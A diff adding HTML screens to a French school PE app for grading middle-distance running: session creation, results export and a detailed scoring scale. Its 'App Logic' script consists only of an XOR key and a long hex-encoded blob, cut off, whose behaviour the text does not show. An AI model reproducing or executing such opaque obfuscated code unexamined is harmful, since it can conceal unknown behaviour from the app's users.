+          <option value="">Toutes les sessions</option>
+        </select>
+      </div>
+      <div id="results-list">
+        <div style="font-size:14px;color:var(--muted);text-align:center;padding:20px;">
+          Sélectionnez une session
+        </div>
+      </div>
+      <button class="btn btn-secondary" style="margin-top:12px;" onclick="exportResults()">
+        📄 Exporter PDF
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN 15 – CREATE SESSION
+     ======================================================== -->
+<div class="screen" id="s-create-session">
+  <div class="topbar">
+    <button class="topbar-back" onclick="showScreen('s-teacher')">‹</button>
+    <div class="topbar-title">Nouvelle Session</div>
+  </div>
+  <div class="screen-inner">
+    <div class="heading" style="margin-bottom:20px;">Créer une session</div>
+
+    <div class="field">
+      <label>Classe</label>
+      <select id="ses-class" autocomplete="off">
+        <option value="Seconde">Seconde</option>
+        <option value="Terminale">Terminale</option>
+      </select>
+    </div>
+
+    <div class="field">
+      <label>Nom de la session</label>
+      <input type="text" id="ses-name" placeholder="Ex: Évaluation Demi-Fond S2" autocomplete="off">
+    </div>
+
+    <div class="field">
+      <label>Code session (lettres et/ou chiffres – max 6)</label>
+      <div style="display:flex;gap:10px;">
+        <input type="text" id="ses-code" placeholder="Ex: EPS1A ou 142857" maxlength="6" autocomplete="off"
+          style="font-size:22px;letter-spacing:.15em;text-align:center;flex:1;text-transform:uppercase;"
+          oninput="this.value=this.value.toUpperCase()">
+        <button class="btn btn-secondary" style="width:auto;padding:0 16px;" onclick="generateCode()">
+          🎲
+        </button>
+      </div>
+    </div>
+
+    <div class="field">
+      <label>Statut</label>
+      <div class="radio-group">
+        <div class="radio-opt selected" id="ses-active" onclick="selectSesStatus('active')">Ouverte</div>
+        <div class="radio-opt" id="ses-inactive" onclick="selectSesStatus('inactive')">Fermée</div>
+      </div>
+    </div>
+
+    <button class="btn btn-green" onclick="createSession()" style="margin-top:8px;">
+      Créer la session ✓
+    </button>
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN – BARÈME COMPLET (AFL 1 / 2 / 3)
+     ======================================================== -->
+<div class="screen" id="s-bareme">
+  <div class="topbar">
+    <button class="topbar-back" onclick="history.back(); showScreen('s-welcome')">‹</button>
+    <div class="topbar-title">Barème EPS Demi-Fond</div>
+  </div>
+  <div class="screen-inner" style="padding-top:12px;">
+
+    <!-- ─── TOTAL ─────────────────────────────────────── -->
+    <div style="background:var(--surface2);border:2px solid var(--blue);border-radius:var(--rad);
+      padding:16px;text-align:center;margin-bottom:20px;">
+      <div class="label" style="margin-bottom:4px;">Note finale</div>
+      <div style="font-family:var(--font-d);font-size:36px;font-weight:900;color:var(--blue);">
+        AFL1 + AFL2 + AFL3 = <span style="color:var(--white);">/20</span>
+      </div>
+      <div style="font-size:13px;color:var(--muted);margin-top:6px;">
+        AFL1 Performance /6 &nbsp;+&nbsp; AFL1 Maîtrise /6 &nbsp;+&nbsp; AFL2 /4 &nbsp;+&nbsp; AFL3 /4
+      </div>
+    </div>
+
+    <!-- ─── AFL 1 — PERFORMANCE ──────────────────────── -->
+    <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--rad);
+      overflow:hidden;margin-bottom:16px;">
+      <div style="background:var(--blue);padding:14px 18px;display:flex;align-items:center;gap:10px;">
+        <span style="font-size:22px;">🏅</span>
+        <div>
+          <div style="font-family:var(--font-d);font-size:22px;font-weight:900;color:var(--white);">AFL 1 — Performance</div>
+          <div style="font-size:13px;color:rgba(255,255,255,.75);">Distance totale sur 3 courses · /6 points</div>
+        </div>
+      </div>
+
+      <!-- Sex toggle -->
+      <div style="display:flex;border-bottom:1px solid var(--border);">
+        <button id="bar-tab-boys" onclick="baremeSexTab('M')"
+          style="flex:1;padding:12px;background:var(--surface2);border:none;color:var(--blue);
+          font-family:var(--font-d);font-size:18px;font-weight:800;cursor:pointer;
+          border-right:1px solid var(--border);">♂ Garçons</button>
+        <button id="bar-tab-girls" onclick="baremeSexTab('F')"
+          style="flex:1;padding:12px;background:transparent;border:none;color:var(--muted);
+          font-family:var(--font-d);font-size:18px;font-weight:800;cursor:pointer;">♀ Filles</button>
+      </div>
+
+      <!-- Performance table boys (visible by default) -->
+      <div id="bar-perf-boys" style="padding:0;">
+        <table style="width:100%;border-collapse:collapse;font-size:14px;">
+          <thead>
+            <tr style="background:var(--surface3);">
+              <th style="padding:10px 14px;text-align:left;color:var(--muted);font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.06em;">Niveau</th>
+              <th style="padding:10px 14px;text-align:center;color:var(--blue);font-weight:700;font-size:12px;text-transform:uppercase;letter-spacing:.06em;">Plot VMA (km/h)</th>
+              <th style="padding:10px 14px;text-align:center;color:var(--muted);font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.06em;">Total 3 courses</th>
+              <th style="padding:10px 14px;text-align:right;color:var(--muted);font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.06em;">Note /6</th>
+            </tr>
+          </thead>
+          <tbody id="bar-tbody-boys"></tbody>
+        </table>
+      </div>
+
+      <!-- Performance table girls (hidden) -->
+      <div id="bar-perf-girls" style="padding:0;display:none;">
+        <table style="width:100%;border-collapse:collapse;font-size:14px;">
+          <thead>
+            <tr style="background:var(--surface3);">
+              <th style="padding:10px 14px;text-align:left;color:var(--muted);font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.06em;">Niveau</th>
+              <th style="padding:10px 14px;text-align:center;color:var(--orange);font-weight:700;font-size:12px;text-transform:uppercase;letter-spacing:.06em;">Plot VMA (km/h)</th>
+              <th style="padding:10px 14px;text-align:center;color:var(--muted);font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.06em;">Total 3 courses</th>
+              <th style="padding:10px 14px;text-align:right;color:var(--muted);font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.06em;">Note /6</th>
+            </tr>
+          </thead>
+          <tbody id="bar-tbody-girls"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ─── AFL 1 — MAÎTRISE ──────────────────────────── -->
+    <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--rad);
+      overflow:hidden;margin-bottom:16px;">
+      <div style="background:var(--surface3);padding:14px 18px;display:flex;align-items:center;gap:10px;
+        border-bottom:1px solid var(--border);">
+        <span style="font-size:22px;">🎯</span>
+        <div>
+          <div style="font-family:var(--font-d);font-size:22px;font-weight:900;">AFL 1 — Maîtrise</div>
+          <div style="font-size:13px;color:var(--muted);">Écart à la ligne cible à chaque course · /6 points (3 × 2 pts max)</div>
+        </div>
+      </div>
+      <div style="padding:14px;">
+        <!-- Bleu -->
+        <div style="display:flex;align-items:center;gap:12px;padding:12px 14px;background:#1a8cff18;
+          border:1px solid #1a8cff44;border-radius:10px;margin-bottom:8px;">
+          <div style="width:20px;height:20px;border-radius:50%;background:var(--blue);flex-shrink:0;"></div>
+          <div style="flex:1;">
+            <div style="font-family:var(--font-d);font-size:18px;font-weight:800;color:var(--blue);">BLEU — Ligne exacte</div>
+            <div style="font-size:12px;color:var(--muted);">Arrivée exactement sur la ligne cible · 0 m d'écart</div>
+          </div>
+          <div style="font-family:var(--font-d);font-size:26px;font-weight:900;color:var(--blue);">2 pts</div>
+        </div>
+        <!-- Jaune -->
+        <div style="display:flex;align-items:center;gap:12px;padding:12px 14px;background:#ffc94018;
+          border:1px solid #ffc94044;border-radius:10px;margin-bottom:8px;">
+          <div style="width:20px;height:20px;border-radius:50%;background:var(--yellow);flex-shrink:0;"></div>
+          <div style="flex:1;">
+            <div style="font-family:var(--font-d);font-size:18px;font-weight:800;color:var(--yellow);">JAUNE — Demi-plot</div>
+            <div style="font-size:12px;color:var(--muted);">± 12,5 m d'écart (jaune + = au-delà · jaune − = en deçà)</div>
+          </div>
+          <div style="font-family:var(--font-d);font-size:26px;font-weight:900;color:var(--yellow);">1,5 pt</div>
+        </div>
+        <!-- Rouge -->
+        <div style="display:flex;align-items:center;gap:12px;padding:12px 14px;background:#ff6a1018;
+          border:1px solid #ff6a1044;border-radius:10px;margin-bottom:8px;">
+          <div style="width:20px;height:20px;border-radius:50%;background:var(--orange);flex-shrink:0;"></div>
+          <div style="flex:1;">
+            <div style="font-family:var(--font-d);font-size:18px;font-weight:800;color:var(--orange);">ROUGE — Un plot</div>
+            <div style="font-size:12px;color:var(--muted);">± 25 m d'écart (rouge + = au-delà · rouge − = en deçà)</div>
+          </div>
+          <div style="font-family:var(--font-d);font-size:26px;font-weight:900;color:var(--orange);">0,75 pt</div>
+        </div>
+        <!-- Blanc -->
+        <div style="display:flex;align-items:center;gap:12px;padding:12px 14px;background:rgba(255,255,255,.05);
+          border:1px solid rgba(255,255,255,.12);border-radius:10px;">
+          <div style="width:20px;height:20px;border-radius:50%;background:#c0ccee;flex-shrink:0;"></div>
+          <div style="flex:1;">
+            <div style="font-family:var(--font-d);font-size:18px;font-weight:800;color:#c0ccee;">BLANC — Hors zone</div>
+            <div style="font-size:12px;color:var(--muted);">± 37,5 m ou plus (blanc + = au-delà · blanc − = en deçà)</div>
+          </div>
+          <div style="font-family:var(--font-d);font-size:26px;font-weight:900;color:#c0ccee;">0,25 pt</div>
+        </div>
+        <div style="margin-top:12px;padding:10px 14px;background:var(--surface2);border-radius:8px;
+          font-size:12px;color:var(--muted);line-height:1.6;">
+          💡 <strong style="color:var(--white);">Zone + (au-delà)</strong> → l'élève a couru plus loin que la cible = distance réelle supérieure → impact positif sur la performance<br>
+          💡 <strong style="color:var(--white);">Zone − (en deçà)</strong> → l'élève a couru moins loin → distance réelle inférieure
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── AFL 2 — AUTONOMIE ────────────────────────────── -->
+    <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--rad);
+      overflow:hidden;margin-bottom:16px;">
+      <div style="background:var(--surface3);padding:14px 18px;display:flex;align-items:center;gap:10px;
+        border-bottom:1px solid var(--border);">
+        <span style="font-size:22px;">⚡</span>
+        <div>
+          <div style="font-family:var(--font-d);font-size:22px;font-weight:900;">AFL 2 — Autonomie</div>
+          <div style="font-size:13px;color:var(--muted);">Gestion de la séance, échauffement, projet de course · /4 points</div>
+        </div>
+      </div>
+      <div style="padding:14px;display:flex;flex-direction:column;gap:8px;">
+        <div style="display:flex;align-items:flex-start;gap:10px;padding:10px 12px;background:var(--surface2);border-radius:8px;">
+          <div style="font-family:var(--font-d);font-size:28px;font-weight:900;color:var(--muted);min-width:32px;">1</div>
+          <div>
+            <div style="font-weight:700;font-size:14px;margin-bottom:2px;">Passif</div>
+            <div style="font-size:12px;color:var(--muted);">Échauffement guidé ou absent. Récupération passive. Aucun projet de course défini. Séance inadaptée.</div>
+          </div>
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--muted);margin-left:auto;">0 pt</div>
+        </div>
+        <div style="display:flex;align-items:flex-start;gap:10px;padding:10px 12px;background:var(--surface2);border-radius:8px;">
+          <div style="font-family:var(--font-d);font-size:28px;font-weight:900;color:var(--orange);min-width:32px;">2</div>
+          <div>
+            <div style="font-weight:700;font-size:14px;margin-bottom:2px;">Partiel</div>
+            <div style="font-size:12px;color:var(--muted);">Échauffement partiel et générique. Suit les propositions de l'enseignant. Projet de course identique à un camarade.</div>
+          </div>
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--orange);margin-left:auto;">1 pt</div>
+        </div>
+        <div style="display:flex;align-items:flex-start;gap:10px;padding:10px 12px;background:var(--surface2);border-radius:8px;">
+          <div style="font-family:var(--font-d);font-size:28px;font-weight:900;color:var(--yellow);min-width:32px;">3</div>
+          <div>
+            <div style="font-weight:700;font-size:14px;margin-bottom:2px;">Autonome</div>
+            <div style="font-size:12px;color:var(--muted);">Échauffement autonome, progressif. Récupération active. Séance adaptée. Projet de course prévu et construit.</div>
+          </div>
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--yellow);margin-left:auto;">2,5 pts</div>
+        </div>
+        <div style="display:flex;align-items:flex-start;gap:10px;padding:10px 12px;background:var(--surface2);border-radius:8px;
+          border:1px solid var(--green);">
+          <div style="font-family:var(--font-d);font-size:28px;font-weight:900;color:var(--green);min-width:32px;">4</div>
+          <div>
+            <div style="font-weight:700;font-size:14px;margin-bottom:2px;">Expert</div>
+            <div style="font-size:12px;color:var(--muted);">Échauffement complet, spécifique et optimisé. Récupération active entre les courses. Projet de course anticipé, réalisé et ajusté selon les résultats.</div>
+          </div>
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--green);margin-left:auto;">4 pts</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── AFL 3 — CHRONOMÉTREUR ─────────────────────────── -->
+    <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--rad);
+      overflow:hidden;margin-bottom:24px;">
+      <div style="background:var(--surface3);padding:14px 18px;display:flex;align-items:center;gap:10px;
+        border-bottom:1px solid var(--border);">
+        <span style="font-size:22px;">⏱</span>
+        <div>
+          <div style="font-family:var(--font-d);font-size:22px;font-weight:900;">AFL 3 — Chronométreur</div>
+          <div style="font-size:13px;color:var(--muted);">Qualité du rôle de chronométreur / juge · /4 points</div>
+        </div>
+      </div>
+      <div style="padding:14px;display:flex;flex-direction:column;gap:8px;">
+        <div style="display:flex;align-items:flex-start;gap:10px;padding:10px 12px;background:var(--surface2);border-radius:8px;">
+          <div style="font-family:var(--font-d);font-size:28px;font-weight:900;color:var(--muted);min-width:32px;">1</div>
+          <div>
+            <div style="font-weight:700;font-size:14px;margin-bottom:2px;">Participation passive</div>
+            <div style="font-size:12px;color:var(--muted);">Chronomètre mal géré, peu de concentration, échanges quasi-inexistants avec le coureur.</div>
+          </div>
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--muted);margin-left:auto;">0 pt</div>
+        </div>
+        <div style="display:flex;align-items:flex-start;gap:10px;padding:10px 12px;background:var(--surface2);border-radius:8px;">
+          <div style="font-family:var(--font-d);font-size:28px;font-weight:900;color:var(--orange);min-width:32px;">2</div>
+          <div>
+            <div style="font-weight:700;font-size:14px;margin-bottom:2px;">Participation basique</div>
+            <div style="font-size:12px;color:var(--muted);">Chronomètre fonctionnel, observations simples, peu d'échanges avec le coureur.</div>
+          </div>
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--orange);margin-left:auto;">1 pt</div>
+        </div>
+        <div style="display:flex;align-items:flex-start;gap:10px;padding:10px 12px;background:var(--surface2);border-radius:8px;">
+          <div style="font-family:var(--font-d);font-size:28px;font-weight:900;color:var(--yellow);min-width:32px;">3</div>
+          <div>
+            <div style="font-weight:700;font-size:14px;margin-bottom:2px;">Participation active</div>
+            <div style="font-size:12px;color:var(--muted);">Chronomètre précis, échanges réguliers, conseils utiles au coureur sur sa gestion de course.</div>
+          </div>
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--yellow);margin-left:auto;">2,5 pts</div>
+        </div>
+        <div style="display:flex;align-items:flex-start;gap:10px;padding:10px 12px;background:var(--surface2);border-radius:8px;
+          border:1px solid var(--green);">
+          <div style="font-family:var(--font-d);font-size:28px;font-weight:900;color:var(--green);min-width:32px;">4</div>
+          <div>
+            <div style="font-weight:700;font-size:14px;margin-bottom:2px;">Expert</div>
+            <div style="font-size:12px;color:var(--muted);">Chronomètre exemplaire, multiples observations pertinentes, échanges argumentés, aide précieuse à la stratégie de course.</div>
+          </div>
+          <div style="font-family:var(--font-d);font-size:20px;font-weight:800;color:var(--green);margin-left:auto;">4 pts</div>
+        </div>
+      </div>
+    </div>
+
+    <button class="btn btn-secondary" onclick="showScreen('s-welcome')">
+      ← Retour à l'accueil
+    </button>
+
+  </div>
+</div>
+
+<!-- ==========================================
+     JAVASCRIPT – App Logic
+     ========================================== -->
+<script>
+(function(){var _k='45505344656d69466f6e643230323421784b397051336d5a';var _h='201e2120133a1d3c2857096479625d450e60733b3d545e1b04391005152e0e0d2925335563774667353d6f1f3a5a1c0a3706050d363e2b0435090a7b5876797508085e261859170e753260300c23053e1b21566b5a4701591031092224045c0d726831312a00082f1f145c011f065a0a0f1b561e2b7b03391f2a6705302a3a733f382a5607637d5b1a720e382456083f2069662a510930321c365278564a5646537b5a47340a1e0a0b7f32771d08083c1f5a5d0078401b784a3153293455370f1300273c2b2f3b285f3a03655a067878286468230901151d1c021a0a4a231b0535370246615951514e064d5b3e571971261307131d340a00260c1c600873640e0a0876033705582c721c29775c1e51740145531d5170430a372d533a05185a626e1f3d1e53024627580f004a0400535330136f286201591d6e616b6f103b5e0e5856024208646d11410273216800253e0d29040a0b07510b2818545d07766c770b050c1f607c151d147f233523280d2044575502400057661c3912190758063b3d3465164a5e2d25090b115c5e655818017e633e167a22710d00230e510559005b0a2319781d56193f065c453741086b753d2120320f10711b22150648747947122e4e3a04630b2e2f246137064606200b020605544a57793e7c0a1c3f47093f0a3a2a7c1654112437281457094765562021723f7e52283c73210527035413722e0d204006681b18401b711500011f0f7d611a145042012f0d5f077c544404152c1e5d3a640a342e1f2a0b33144642082d5c0f58645c41692c130113034a22752601233604461d771e1c515d5f6341750c1a6f353b695d2d16111d3220211375210b165504020d0e531a4c0815002c131c0003025c5d3b7e400423704a4004113d190b086400181e0b1239723c061d742428500a0354595b3e724d202543553f2c1f210d365b0e28072d14585e4a77161e2c73147e7c583504007c202a54017024242d5d647b614711221643106b180e1c1434254e253e140a2a2565527d03494c1b4143617b1b0a03683f1e08251b304021067147770d674f337a071d5b1a0a073d2007315920273e183655525e00123c1e0e3f01071d0a157f6112222c5a01063a0e025b4b53680b12010518601a1b0a38320e083c0b770625265367025e4b357b731d135237372a15143d283f1910370d37444267726d570a0e1d3e59540b221b601757145d2019213d557f434476283d0a461d0b14083f111d0b21373e2509581e73484a6473412f750532573a2c75092b11315e5d253d5d23035f4442630a3c68496675392b3222352a373d2b1c022d1341687373591d295008351c580211670a061421511315415606780a626534604333235d3c1872193823081f397f1d1b17627c58047812195814265658383227100d27035c0e1921137463675b71092074321d0b3a092c1d372c301c1c0a222b160b674b415732027f4627415e6973000b003f1746272d170d0a727b77191a0677222378466234226a37565c306903034f01064051431c790e24660b35387d1a276b111b2d3e2618555745557b714e1a5c4009520c68741e38172b2b462b5a051746567f646f3e7d71451c455f1b703b263d535d3f291a5636467603421515054c423e565f0972116429332b4213150b22501b7f040e2f6450293c04083d6e031f7d022133325d0c3d745256406f362a5527120a540b7d67251510025a69070d3d46525c43794a39581f62041e2e2311393023015e3e1e365c51487b646d29644f082b475b2f0436363d02072505352b3c70057e6d6713724a371b410e2e28001214235411322e4552007257027639255f3c105d0b16221c272812255a1e3e3e114771546e453c2e4c4713473e280024183627192a34211e1c6a74685e572b0f7d161c642e712a68157c2f1a1f2b1e1415706448566e57736932624059712b680b7d521b21731758215c5e5f0c18392348117a7e2b087319063411195015025d02595a545c1908270c4813793f2f0019026f550b38143a233102695346193c296d4613410c2c35036733072128293d05205958535c171b124e1b60610b710a6610310c1d253c215b5d1909401f6d36247b22157c3b020413217217061b755f39036340505a1311724011634a3d356e191d3c2e212873232d357c1f7c5e144e250e423c03356f3f0816112f46237f293e2f595e41644f1d080b1c14572f6333171b2b145e311429034f7a440603591426522036002e2a21050409552442203f0a5519565070591b035d120845591208360721350b3301270a234304034c4911230b08027755127621166b5324030d23031d60715b66701a087d031005293e2a3e1a70222339205725257a58041b584e2d165b0501240833216b0d280c0271373d2b02060b4c103f781600234542367c672416542459171f1b5c48564877682c3e7e0866631e0a337f3d0a03553330575d5444695c1b4236600c3c62561d6d7535641e53051e1f1f18207b5448460e34130813286b0c71046730293d2b0d280b3a3c735f586c603e79561a3352291f233f780c54255a69591c4b61540b6712280d52123b00340271080a6b0c035a1f0c27346b5f5a456f2d337141296b271427383076033d5a7e2e230a67720b734c281d5635167d0f1c003924272c0f07252a0d17715d717c541c0c571505430b37732602350c0e2d6d5a1a5300095e7a481b190f3f3603282c1167671055391a0a19392c63096355650b7d4a297a5a030b6a11323c0f032a313b181d707f7b4e662128123c104b042b283e39051c0828100c370301444a5213000971151a413a1c6a3a340101041e0d2d38275768544e524c195542077e38382d123e260a2e4629235d221d686170730a7f5729050b0922061e111114252c07052c1545536471683a795f1f3f5555752402242f032b0b035b3c230a1f0203432f600a427a185c0c20180a1d1d0e2a28025a027e4906677b120e0d1e095f152e0b00102f543e1872250b535d55745f74121b0c353b62051724023c2f033e51075a1e307d7c551b44193d6e27661c040032363f2c12082a0f3a292c60067d07480c114f227a4a2e0307111d222d5d2c23190a4b44035e0554221e5b1e39443a300829151512551f045c264f79585503622205430667003b3822296b2029055a2b2d1d017a726b6465212e58223660350c2018140d533d1f173e570a5c7162731315230c372751223e1d20601657292a691e0f2501537f4c172d135c3d3a5f240e26172373342825123e410c715664587513070837154b3f177101120f232f0823175d507674596212281b7831697b2b6a283f2b1554062d2d560c57477d617b12303b695b025e2f0b283b623e53245b37390b2f7e5d7358172e196902684419221267036b143f052c3736067a03634c6e3a256c220472086e1720663e24290d223c5d1e445505784d017d7d2237473a31013316002922282440051058635d474a17007c2007001e0a7c393e0a342a1b3f3b192f061f045c713e0c0807327f1a1e747b390e53392c212a3f51025b031b422d7e74117a7c2b08203d2a1429371c133b2f265403504e6b16284b3a65702362081b381611205a3f16192c5d57597562571c6a1708553823201c0529133723343a3d207c4676047b1d210129195a22113211172d091f013c20412a0074005f76390c49140163250971623209035c0b2a39575c6a477678764c084f4405180c206a04000331585f09075a001903734d72301f5e37030058390b0260131d2c2634445c3d53476050631d0d6a041d552e3273223b322d1a3130402851034356556c572f7131671c1f0c16381d0b365b3f23360c0307497e576b2a3360372107381e2723340b2d590e7556572f575741641741194a16697f460e7329190e1f1a0b6d44183360011942633a0f4b046046073e12386b2f5228300522031d5c03646e0e162c720234791568221a6220515c27705b1934477c5406440a080929345d29333d293d212c0a59173b374b714a58704e411a5b5b06461c75167b0410291d1e693f5f5005746a4651352d68381002053c0d632120115d0a0335040a730456724a121c5536180534000919642126372b35085b526374575d4d353c6c111d7238680c681673170724231839576a5868404e3c297812395e5a1b75222670572a33345d3c4f47796a1b4337045b1c25691b1624693532325c5a3e2827307072445d6648047c05677f422f0d3331772e543023573f3377645753790e7e0e1f2b46423e163e257756460e081d5f30596841455b392d4a26200a5f0007200b002e285b2c360f0056715a55183f25500361763d140404162d164242345f2f570a560a720a3d195b40366620032b18041d3519241226245c6545464e6f17064f14085d3e221418292e2458421e163a577167765f4509734d2721401e0c76030b143c0701095b3a1c705c0a67584b7c4c366252072f063307225700231e22042b055b075f7b2d0e0d17667c58332e3411091d252d6d440a2c0442635a72312d53421f54232a721302772a420e105c5d5d586565451733114a32087b35623d3314103d38052e025f5c764a034155130f5b3b2741212a3124647756552e00373b570a541d6d4530186a1b24442b6c7032782e265b393f1f2728585c7c077b3e2e500336501528042a3f0c2a2a59031c0705737663034515127a3f0b7a550a7115172c143c19143e1e0d4462007e631b7a0a11016527347d21290b532f2e33235d017972750464083f0b1826012f2b3d3f37164e0739012226375b6978664a301b5c321d5a5e2316150221375a283c363a165461710111490c4b09260b071028690433132b0f7101282279015f64714b12411a605d090c16232a7d520b59020c0c20486a7a40712e040139067c462b02110a2c172c507717210f427d7d5560002e744469693d161260230d15461e28590a3d06094470744f1b4d1401713769221d621d240b3305190a534800577d6300027c081a55096c0d1b221c4e211b302b0b206500001f733c7f5520277a2b623c7f2321065d5d1227590b017d045e622f23741a3202033e0228091e2320591c195b3448755963751c3f0f2003495e3d34623f2735032a352c2d5d74767d4d571b2a5a29000505300f13197756213910592f3c7673007e181c23504605670e107333250c160f2e2319580c56517860543a2d48163903370b7c66203e3c213f70210c26535e636353492a4c316064026f3716312a02273f7f241631555e5c61573c1a55243856032c01661a2b171f1972092f1145010778783d264b041f45002f17001734265822752b2d137e071d5c6f0d000a18016059161f1b3f0f151a256924173376407c6d640c26785f6856266a303734373f0c1d055b172b64615e6e6313010f311776552936691d140e262a00035a0355626645674a3a511535711f2b1236372e17581c24561f57515966566d4f0a600837412f6a1f6605715c5b5c73273e3c05617646463a290a5f2742046817091e72115f3f275826100b725877562d1e6e3c65492b080220313e5d210f25442d377c5f05520a143b5a136700256f3d61233c36143a021a282763586845123c120d1f27661f1233166374075a3123185f32757573524a2109713f3c490f36300437032c585f003e0100427f7a646748005822657c09377734302734041c1e0d5b22005b7b4e4b0b28123c39505520201603715c3d27692904376a595f58721b1b43141e00222a293d26301f010f005a03314051015b1753220c3260585e7513316225121f05770d5c0e02454057542f21614919582c6b7d1c621d035f5875372a29615e5040191d2a55003851281b07227c6f265e2121175e25534a580d762c064f201e07000c132135124e0211232c1d215d435103113a275148345b2f6f160622020b0b1f69172d2b027f060d631f090b3f14593f1b3d7b302210463914443b07195a577d403b3b693a247d1b6b2e66072d2428012217410d6204460c45010f5a11675d35102f09256b24293173003c07665e7e057434076e23615d5c1f2c2220012a5f071640454b1943015d6e413d76163b7b5c6e07623406505b2d281559117d63600477331e41261b0b261215060a720b0102293a010b5762535e593064003a66630630301e01725d35110e1720094b57446459161d580266513b6c0f3202061222102806071c7f68025e6b352173071d4a390a0f0627722e390603055736707c6b7c4b3e275623650a040a33270670141e022424391e7d5304514c34331625077255203c1a227d075f013c3e0203577277790e0e3d531538601b3b1532292520351a030d371306787950513e0d0e3e23405b222a63033150193a224028026b62457843572757293d552c093d681b165d3c2d10275a087b790b714500735320384658220318017d124659142a5b096a6a65016b30200f337e7e5a1773347834572c0d300b3906056665404f4f3e531a355a0e0a6e1d78170718103323073c73677005513612602161491e2b03160629041f2e340a1c2340004a51161d247136235f5b10071719753321251f5e360f6a06037d7717095a06677805757c07002e001e2007202722196960736b57795e21346006622b033c3d302f420804582c6a717f7f754c1d6b1f385a0920232365312d3905231f5d0b7107764740361e7144147e221114350674361f5a042a0951737457760e1438413c2258073373173429345f0a301c03164a7a01634a2022570765455b6d200a3603560831111b05525867796d7014796b473e0a253d2f13343d12190b2b180429735e5f6419220978311d402c17041d092e011d2d2c210d267e72577f590c12001b047c201273191b1d375e241c56192255594a6d42302c164905623f6207223a110c3d3920061f4b6007606e563a3c7b5b00582f120d0832032a3a2322291e124640535f442e3f4e20085f043e1766620d120e272739031d655d55406839735e206165426a2a073f102b370622595e105043077b5b0c07722315593a753718043726462472395b1203726142134e3b5b0a170042333f1a3c28225c5e311c16291d5a557a114d0a6d07666b09103311060f52025a121e2b21760450524a4f03554615785503003e66140001047e051b2855517c0d190d1c0c41220b0c71346717223d355103282c2e06475a7b4f0b125d1d18593f3e3567641c32542a0f5b183204024b525621315c31174a282d071a04303f5d512d361b5175685d0c192c24432910025d3c7d1331061c0a0e2f1e3c0c06070664633f28010a01550f6b3d121c21225b2b0521272f475545414a202901332956351d7d7b372d4a5f2d2c363e11791f786d68577d61161f475b2c73323a0c1d15237f3916231d02565012137a4105657954113507652104060d284434351d03604c152b1270061a451e290f343432285851171f044b035840035b3e0f4807190b1c342e3b3d1529543b135c040a570142614f4109533f221c226e33062a1c2b1b460e0c2f4f7c047152442a7c58021f5d0912117f05350b0c0f710e260e5a400642174c19741666502e6a761a3632542f2a241d2a035f5c4a4d150139490614003e0d07002b172e003c725a27254866547d591302782226492a231020151d341c5a095c01115c64055212480c700324611f2f003f0934545c04110c141459766070194a2d0e403d04540314387c3d165a58295b2c177b667e531434796021196b021e083b111024543f2c0c1b1d5a645d5957192f6f181f62046d7219200b3623460e251430425b6052644f0a7b3b29790a0d740314322b5e38273a0c525b057377671a274e1461580b20727b352f2a1a3e305d2d344102004371022d6e153777032f0d363d07375a19163f2d250a1f605b471a28762415453c000d03312f14093e0807053404575165681e3d7a1f367b0618212622172d2946363e170f61547853424e735c122900280f17210276121804730559077a03555e4e2f1b0f361459073114250027510b100b5b17250b57051b191c3c711900780a6c010a1a0a012a5b0e033d2a5666601b521d2e5309395224142c393533375a3320091c0b56085a654a2b287414216054096a210b7c4e543f3f2d14207d73055c4b3c247e1d136a0e117711271c5020302b5c0a0157525c4d10407e5019075a5a3e34041572532a1c2e281830066446674a57325d1a01495a387c27376f2b595a2f050d2355675f5f58011a5b1d3e71421c7727100e040222033f5c08005b5370493e2f7e353a4b2e3e321e050c3c3c3107162803717154466414037331366b2b1f143d781e21542d27590632477956644d3f390f343c663e1e3205167434045025291c31737b7e4244537c693d68690736020565072f28032a3c2b23625a53016b1f32161902425f1310673435005406161b5d07015e48077b0e394b3e1e071f31133202262d3c3e2e35290875615453771b260d1f19653417367f0a7c26220c3c22232c0174634570330f7836160022232d0430053538042128192b51580b566c287f48312601040b733b1170513702723d2d29075b77574a3f73781d155d2f0a15003b1420245e013e2a1776057302192e0770363574460801391a2515595c230b3f1419565b575b3e2e0e1100470b1b10336b0732585c331f2d09516778764039070017095829381723110b0a191d2325083662774b64600f0d76213b5c146c080717033224261e013f2e7b576a51162a295119666a55310d1819363d262b0c3a022d777e7c55123d07761b1b54290373271d13515e5b365b2a0d7760605a671e2477176355220e100111270c1f5b0f560f0e547c06514b0c02733d140a241823116132275923202e16567976634e564d1b6d083863372e101d112203080e282e08375b00005e4629110e1d30593d3176053c7c001a33101d452f7f60560d143321581633645f162b3135143d1511255c38237641540360287d4c5b1f64261e28222b3d2721106923023e411b6771574f3e5846347218097727252f17170d771e283460416843154c790a45361c140874211c070c2331771e5d27077e0b465b41015d5f2b6a2b380c1e6a1c063e1a05251f2b70457150764c0f0143330a3439091a3f0f10041c2c23051445576b61444a0e0137007e0f2904340726090f1d103c4556577b73454e28797245230b46322a291a325321253f23414f4665465d790d3b010962660336011f170801020e1e071a2f54436a77670e246131327222287527060b2028241436052357655b771102005422037438316e373075152a2a175f3b095b785a7c4e340a0f3e304034392124631007383c2e190527425b71531102790f3d257a296a2b113e2d5615057e0a0237755f005c180d236d1c27061c3826186a73031542020d594b53027c077b4c2151133b7e5810221201773015397607172d731b4004621b194d3728763c1510152776533